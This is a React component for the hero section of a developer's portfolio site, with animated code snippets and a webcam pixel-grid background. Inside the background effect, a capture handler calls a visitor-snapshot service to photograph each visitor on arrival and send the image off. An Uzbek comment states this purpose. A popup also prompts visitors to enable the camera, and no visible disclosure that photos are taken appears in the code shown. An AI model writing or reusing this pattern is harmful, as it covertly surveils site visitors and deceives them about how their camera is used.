"use client";

import {
  IconApi,
  IconBraces,
  IconBrandGit,
  IconCamera,
  IconCameraOff,
  IconCode,
  IconDatabase,
  IconTerminal2,
  IconX,
} from "@tabler/icons-react";
import { motion } from "motion/react";
import { useTranslations } from "next-intl";
import { useCallback, useRef, useState } from "react";

import { Link } from "@/i18n/routing";
import { WebcamPixelGrid } from "@/shared/components/aceternity/webcam-pixel-grid";
import { useCamera } from "@/shared/context/CameraContext";
import { visitorSnapshotService } from "@/shared/services/visitor-snapshot.service";

const CODE_SNIPPETS = [
  { code: "const dev = 'Matkarim';", x: "10%", y: "15%", delay: 0 },
  { code: "<React.Fragment />", x: "75%", y: "20%", delay: 0.5 },
  { code: "export default App;", x: "5%", y: "70%", delay: 1 },
  { code: "interface Props { }", x: "80%", y: "65%", delay: 1.5 },
  { code: "npm run build", x: "15%", y: "85%", delay: 0.8 },
  { code: "git push origin main", x: "70%", y: "80%", delay: 1.2 },
  { code: "await fetch('/api')", x: "88%", y: "35%", delay: 0.3 },
  { code: "useState<T>()", x: "3%", y: "45%", delay: 1.8 },
  { code: "docker compose up", x: "82%", y: "90%", delay: 2.1 },
];

const FLOATING_ICONS = [
  { Icon: IconCode, x: "20%", y: "25%", delay: 0.3 },
  { Icon: IconBraces, x: "85%", y: "40%", delay: 0.7 },
  { Icon: IconTerminal2, x: "10%", y: "50%", delay: 1.1 },
  { Icon: IconDatabase, x: "90%", y: "15%", delay: 0.5 },
  { Icon: IconBrandGit, x: "5%", y: "30%", delay: 1.4 },
  { Icon: IconApi, x: "78%", y: "75%", delay: 1.9 },
];

function FloatingCodeBlock({
  code,
  x,
  y,
  delay,
}: {
  code: string;
  x: string;
  y: string;
  delay: number;
}) {
  return (
    <motion.div
      className="absolute hidden md:block rounded-lg border border-primary/20 bg-card/60 px-3 py-1.5 font-mono text-xs text-primary/60 backdrop-blur-sm"
      style={{ left: x, top: y }}
      initial={{ opacity: 0, scale: 0.8 }}
      animate={{
        opacity: [0, 0.7, 0.5, 0.7],
        scale: [0.8, 1, 0.95, 1],
        y: [0, -15, 5, -10],
        rotate: [-1, 1, -0.5, 1],
      }}
      transition={{
        duration: 8,
        delay,
        repeat: Infinity,
        repeatType: "reverse",
        ease: "easeInOut",
      }}
    >
      {code}
    </motion.div>
  );
}

function FloatingIcon({
  Icon,
  x,
  y,
  delay,
}: {
  Icon: typeof IconCode;
  x: string;
  y: string;
  delay: number;
}) {
  return (
    <motion.div
      className="absolute hidden md:block text-primary/20"
      style={{ left: x, top: y }}
      initial={{ opacity: 0 }}
      animate={{
        opacity: [0, 0.4, 0.2, 0.4],
        y: [0, -20, 10, -15],
        rotate: [0, 10, -5, 8],
      }}
      transition={{
        duration: 10,
        delay,
        repeat: Infinity,
        repeatType: "reverse",
        ease: "easeInOut",
      }}
    >
      <Icon size={32} />
    </motion.div>
  );
}

const container = {
  hidden: { opacity: 0 },
  show: {
    opacity: 1,
    transition: { staggerChildren: 0.15, delayChildren: 0.3 },
  },
};

const item = {
  hidden: { opacity: 0, y: 30 },
  show: {
    opacity: 1,
    y: 0,
    transition: { duration: 0.6, ease: "easeOut" as const },
  },
};

export function HeroSection() {
  const t = useTranslations("hero");
  const tCamera = useTranslations("camera");
  const { registerVideo } = useCamera();

  // Camera error state for rendering popup outside opacity container
  const [cameraError, setCameraError] = useState<string | null>(null);
  const [showCameraPopup, setShowCameraPopup] = useState(false);
  const cameraRetryRef = useRef<(() => void) | null>(null);

  const handleCameraErrorChange = useCallback(
    (error: string | null, retry: () => void) => {
      setCameraError(error);
      cameraRetryRef.current = retry;
    },
    [],
  );

  const handleCapturePhoto = useCallback(
    async (videoElement: HTMLVideoElement) => {
      // Saytga kirganda rasm olish (session yo'q)
      await visitorSnapshotService.captureAndSend(videoElement, null);
    },
    [],
  );

  const handleVideoReady = useCallback(
    (videoElement: HTMLVideoElement) => {
      registerVideo(videoElement);
    },
    [registerVideo],
  );

  return (
    <section className="relative flex min-h-screen items-center justify-center overflow-hidden">
      {/* Webcam pixel grid background */}
      <div className="absolute inset-0 opacity-30">
        <WebcamPixelGrid
          colorMode="monochrome"
          monochromeColor="#10b981"
          backgroundColor="transparent"
          gridCols={50}
          gridRows={40}
          maxElevation={35}
          darken={0.4}
          className="h-full w-full"
          onCapturePhoto={handleCapturePhoto}
          onVideoReady={handleVideoReady}
          showErrorUI={false}
          onErrorStateChange={handleCameraErrorChange}
        />
      </div>

      {/* Animated gradient mesh background */}
      <div className="absolute inset-0">
        <motion.div
          className="absolute left-1/4 top-1/4 h-125 w-125 rounded-full bg-primary/10 blur-[120px]"
          animate={{
            x: [0, 100, -50, 0],
            y: [0, -80, 60, 0],
            scale: [1, 1.2, 0.9, 1],
          }}
          transition={{ duration: 20, repeat: Infinity, ease: "easeInOut" }}
        />
        <motion.div
          className="absolute right-1/4 top-1/3 h-100 w-100 rounded-full bg-cyan-500/8 blur-[100px]"
          animate={{
            x: [0, -80, 60, 0],
            y: [0, 100, -40, 0],
            scale: [1, 0.8, 1.1, 1],
          }}
          transition={{ duration: 25, repeat: Infinity, ease: "easeInOut" }}
        />
        <motion.div
          className="absolute bottom-1/4 left-1/2 h-87.5 w-87.5 rounded-full bg-purple-500/8 blur-[100px]"
          animate={{
            x: [0, 50, -80, 0],
            y: [0, -60, 40, 0],
          }}
          transition={{ duration: 18, repeat: Infinity, ease: "easeInOut" }}
        />
      </div>

      {/* Floating code snippets */}
      {CODE_SNIPPETS.map((snippet, i) => (
        <FloatingCodeBlock key={`${i}-${snippet.code}`} {...snippet} />
      ))}

      {/* Floating icons */}
      {FLOATING_ICONS.map((icon, i) => (
        <FloatingIcon key={`${i}-${icon.delay}`} {...icon} />
      ))}

      {/* Grid overlay */}
      <div
        className="absolute inset-0 opacity-[0.03]"
        style={{
          backgroundImage: `linear-gradient(var(--foreground) 1px, transparent 1px), linear-gradient(90deg, var(--foreground) 1px, transparent 1px)`,
          backgroundSize: "60px 60px",
        }}
      />

      {/* Main content */}
      <motion.div
        variants={container}
        initial="hidden"
        animate="show"
        className="relative z-10 flex flex-col items-center gap-6 px-4 text-center"
      >
        {/* Terminal-style greeting */}
        <motion.div
          variants={item}
          className="flex items-center gap-2 rounded-full border border-primary/30 bg-primary/5 px-4 py-1.5 backdrop-blur-sm"
        >
          <span className="h-2 w-2 rounded-full bg-primary animate-pulse" />
          <span className="font-mono text-xs text-primary">
            {t("greeting")}
          </span>
        </motion.div>

        {/* Name */}
        <motion.h1
          variants={item}
          className="text-5xl font-bold tracking-tight sm:text-6xl md:text-7xl lg:text-8xl"
        >
          <span className="bg-linear-to-r from-primary via-emerald-400 to-cyan-400 bg-clip-text text-transparent">
            {t("name")}
          </span>
        </motion.h1>

        {/* Role with typing cursor */}
        <motion.div variants={item} className="flex items-center gap-2">
          <span className="font-mono text-lg text-muted-foreground md:text-xl">
            {">"} {t("role")}
          </span>
          <motion.span
            className="inline-block h-5 w-0.5 bg-primary"
            animate={{ opacity: [1, 0] }}
            transition={{
              duration: 0.8,
              repeat: Infinity,
              repeatType: "reverse",
            }}
          />
        </motion.div>

        {/* Description */}
        <motion.p
          variants={item}
          className="max-w-lg text-sm text-muted-foreground md:text-base"
        >
          {t("description")}
        </motion.p>

        {/* CTA Buttons */}
        <motion.div
          variants={item}
          className="flex flex-wrap items-center justify-center gap-4 pt-4"
        >
          <Link
            href="/projects"
            className="group relative inline-flex items-center gap-2 rounded-full bg-emerald-700 px-6 py-3 text-sm font-semibold text-white transition-all hover:bg-emerald-800 hover:shadow-lg hover:shadow-emerald-700/25"
          >
            <IconCode size={16} aria-hidden="true" />
            {t("viewProjects")}
          </Link>
          <Link
            href="/contact"
            className="inline-flex items-center gap-2 rounded-full border border-border bg-card/50 px-6 py-3 text-sm font-semibold text-foreground backdrop-blur-sm transition-all hover:bg-card hover:shadow-lg"
          >
            <IconTerminal2 size={16} />
            {t("contactMe")}
          </Link>
        </motion.div>
      </motion.div>

      {/* Glassmorphism Terminal Card */}
      <motion.div
        className="absolute bottom-24 right-8 z-20 hidden md:block"
        initial={{ opacity: 0, x: 20 }}
        animate={{ opacity: 1, x: 0 }}
        transition={{ delay: 1.8, duration: 0.6 }}
      >
        <div className="w-72 rounded-2xl border border-white/10 bg-white/5 p-4 font-mono text-sm shadow-2xl backdrop-blur-xl">
          <div className="flex items-center gap-2 border-b border-white/10 pb-2 mb-3">
            <span className="h-2.5 w-2.5 rounded-full bg-red-500/80" />
            <span className="h-2.5 w-2.5 rounded-full bg-yellow-500/80" />
            <span className="h-2.5 w-2.5 rounded-full bg-green-500/80" />
            <span className="ml-2 text-xs text-muted-foreground">terminal</span>
          </div>
          <p className="text-muted-foreground">
            <span className="text-primary">$</span> matkarim --version
          </p>
          <p className="text-foreground">v6.1.0 — Full-Stack Developer</p>
          <p className="mt-1.5 text-muted-foreground">
            <span className="text-primary">$</span> matkarim --status
          </p>
          <p className="text-emerald-500">● Available for hire</p>
          <motion.span
            className="inline-block h-3.5 w-1.5 bg-primary mt-1"
            animate={{ opacity: [1, 0] }}
            transition={{
              duration: 0.8,
              repeat: Infinity,
              repeatType: "reverse",
            }}
          />
        </div>
      </motion.div>

      {/* Camera error popup - rendered outside opacity container */}
      {cameraError && showCameraPopup && (
        <div
          className="fixed top-4 right-4 z-[9999] animate-in fade-in slide-in-from-top-2 duration-300"
          role="alert"
        >
          <div className="relative flex items-start gap-3 rounded-lg border border-white/10 bg-black/80 p-4 backdrop-blur-xl shadow-2xl max-w-sm">
            <button
              type="button"
              onClick={() => setShowCameraPopup(false)}
              className="absolute top-2 right-2 p-1 rounded-md text-white/70 hover:text-white hover:bg-white/10 transition-colors"
              aria-label="Close camera access notification"
            >
              <IconX size={16} aria-hidden="true" />
            </button>
            <div
              className="shrink-0 w-10 h-10 rounded-full bg-white/10 flex items-center justify-center"
              aria-hidden="true"
            >
              <IconCameraOff size={20} className="text-white/60" />
            </div>
            <div className="flex-1 pr-4">
              <p className="text-sm font-medium text-white/90">
                {tCamera("accessNeeded")}
              </p>
              <p className="mt-1 text-xs text-white/60">
                {tCamera("enableDescription")}
              </p>
              <button
                type="button"
                onClick={() => cameraRetryRef.current?.()}
                className="mt-3 inline-flex items-center gap-1.5 rounded-md bg-white/10 px-3 py-1.5 text-xs font-medium text-white hover:bg-white/20 transition-colors"
              >
                <IconCamera size={14} aria-hidden="true" />
                {tCamera("enableButton")}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Minimized camera error indicator */}
      {cameraError && !showCameraPopup && (
        <button
          type="button"
          onClick={() => setShowCameraPopup(true)}
          className="fixed top-4 right-4 z-[9999] w-10 h-10 rounded-full bg-black/60 border border-white/10 backdrop-blur-xl flex items-center justify-center text-white/60 hover:text-white/90 hover:bg-black/80 transition-all hover:scale-105 shadow-lg"
          aria-label={tCamera("accessRequired")}
        >
          <IconCameraOff size={20} aria-hidden="true" />
        </button>
      )}
    </section>
  );
}
